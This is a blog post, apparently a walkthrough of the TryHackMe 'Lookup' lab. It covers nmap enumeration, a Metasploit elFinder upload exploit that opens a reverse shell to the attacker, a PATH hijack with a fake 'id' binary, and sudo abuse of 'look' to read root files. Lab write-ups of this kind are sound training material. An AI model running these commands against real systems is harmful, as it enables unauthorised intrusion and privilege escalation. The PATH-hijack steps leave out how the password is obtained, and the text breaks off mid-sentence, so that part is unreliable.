---
layout: post  # Use your theme's default post layout, or 'page' if it's a static page
title: "Tryhackme Lookup Walkthrough - Pentest Lab Notes"
date: 2025-03-02   # Adjust timezone if needed
categories: [tryhackme, walkthrough]
tags: [ctf, enumeration, exploit, Lookup, writeups, htb, writeups, tryhackme, Linux, wordpress, cracking, walkthrough]
author: h4ck3rfirst
---

# 🔍 TryHackMe - Lookup Room Walkthrough

Welcome to the walkthrough for the [Lookup](https://tryhackme.com/room/lookup) room on TryHackMe. This challenge involves web enumeration, file upload exploitation, reverse shell access, and privilege escalation using Linux misconfigurations.

## 📌 Room Details

- **Platform:** TryHackMe  
- **Room:** Lookup  
- **Difficulty:** Easy–Intermediate  
- **Focus:** Web exploitation, file upload, reverse shell, privilege escalation



### 1. Nmap Enumeration

```bash
nmap -A -F -oN nmap.txt 10.10.83.34
```
🔍 Open Ports

    22/tcp - SSH (OpenSSH 8.2p1 Ubuntu)

    80/tcp - HTTP (Apache 2.4.41)

### 2. Web Enumeration

    Web interface presents a login form.

    Valid credentials found:

        admin : --------

        jose : password123

    Application running: elFinder file manager

### 3. Exploit: File Upload (elFinder + Metasploit)
```
msfconsole
use exploit/unix/webapp/elfinder_php_upload_exec
set RHOSTS files.lookup.thm
set LHOST tun0
set LPORT 9999
run
```
### 🎯 Meterpreter shell received as user: www-data
#### 4. Shell Upgrade

To upgrade to an interactive shell:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
#### 5. PATH Hijack via Fake id Binary

To spoof the environment:
```
echo -e '#!/bin/bash\necho "uid=33(think) gid=33(www-data) groups=33(www-data)"' > /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
```
Verify hijack:
```
id
```
#### 6. Lateral Movement — Switch to think
```
su think
Password: ----------------
```
✔️ Switched to user think
#### 7. Privilege Escalation Using look

Check sudo privileges:
```
sudo -l
```
Output:

(ALL) NOPASSWD: /usr/bin/look

Abuse the look command to read the root and user flag:
```
sudo /usr/bin/look '' /root/root.txt  
```
## Flags

    User Flag: Found in /home/think/user.txt
    Root Flag: Found in /root/root.txt

✅ Summary
Phase	Technique
Initial Access	Metasploit – elFinder Upload Exploit
Shell Upgrade	pty.spawn()
User Enumeration	PATH hijack via fake id
Lateral Movement	su think using password from output
Privilege Escalation	sudo /usr/bin/look to read root flag
🧠 Key Takeaways

    Always run sudo -l as soon as you escalate to a new user.

    PATH hijacking can allow you
